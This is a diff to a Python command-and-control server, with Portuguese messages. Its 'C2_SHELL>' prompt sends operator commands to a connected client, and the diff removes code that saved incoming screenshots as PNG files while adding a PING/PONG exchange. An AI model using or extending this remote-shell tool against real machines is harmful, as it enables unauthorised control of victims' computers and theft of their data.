@@ -14,19 +14,15 @@ def receive_handler(client_socket):
                 print("\n[-] Conexão encerrada pelo cliente ou payload inválido.\nC2_SHELL> ", end="", flush=True)
                 break
             
-            if payload.startswith(b'\x89PNG\r\n\x1a\n'):
-                nome_arquivo = f"screenshot_{threading.get_ident()}.png"
-                with open(nome_arquivo, "wb") as f:
-                    f.write(payload)
-                print(f"\n[+] Imagem salva: {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
-            else:
-                texto_recebido = payload.decode("utf-8", errors="replace")
-                print(f"\n{texto_recebido}\nC2_SHELL> ", end="", flush=True)
-                
+            texto_recebido = payload.decode("utf-8", errors="replace")
+            print(f"\n[+] Recebido: {texto_recebido}\nC2_SHELL> ", end="", flush=True)
+            
+            if texto_recebido == "PING":
+                protocolo.enviar_mensagem(client_socket, "PONG")
         except socket.timeout:
             continue
         except OSError:
-            print("\n[-] Erro de E/S no socket de recepção.")
+            print("\n[-] Erro de E/S no socket de recepção.\nC2_SHELL> ", end="", flush=True)
             break
 
 def start_server():
@@ -44,7 +40,6 @@ def start_server():
     try:
         client_socket, client_address = server.accept()
         print(f"[+] Conexão aceita de {client_address[0]}:{client_address[1]}")
-        
         client_socket.settimeout(1.0)
         
         recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
@@ -55,18 +50,14 @@ def start_server():
                 command = input("C2_SHELL> ").strip()
                 if not command:
                     continue
-                    
                 protocolo.enviar_mensagem(client_socket, command)
-                
                 if command == "/exit":
-                    print("[*] Closing connection.")
                     break
             except KeyboardInterrupt:
                 break
             except OSError:
                 print("[-] Erro de envio no socket principal.")
                 break
-                    
     finally:
         server.close()
 
